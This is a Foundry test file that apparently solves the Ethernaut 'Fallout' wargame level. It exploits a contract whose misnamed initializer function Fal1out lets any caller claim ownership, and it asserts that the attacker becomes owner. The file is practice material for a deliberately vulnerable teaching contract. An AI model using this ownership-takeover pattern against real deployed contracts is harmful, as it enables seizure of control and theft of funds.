// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/attacks/02-Fallout.sol";

contract FalloutTest is Test {
    Fallout target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        target = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        vm.startPrank(attacker);

        target.Fal1out{value: 1 wei}();

        vm.stopPrank();

        assertEq(target.owner(), attacker, "Failure: Attacker did not become owner");
    }
}
